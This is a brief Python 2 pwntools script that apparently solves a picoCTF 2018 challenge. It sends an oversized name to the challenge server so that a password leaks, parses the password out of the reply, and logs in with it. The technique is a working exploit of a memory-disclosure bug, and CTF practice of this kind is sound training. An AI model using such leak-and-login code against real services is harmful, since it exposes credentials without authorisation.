# python2
# coding=utf-8
from pwn import *

r=remote('2018shell.picoctf.com', 23685)
r.recvuntil('name')
r.sendline('a'*10000)

password=r.recvall().split(',')[1].split('\n')[0].strip()

# print password
r=remote('2018shell.picoctf.com', 23685) 
r.recvuntil('name')
r.sendline('zeze')
r.recvuntil('Password')
r.sendline(password)

print r.recvall()

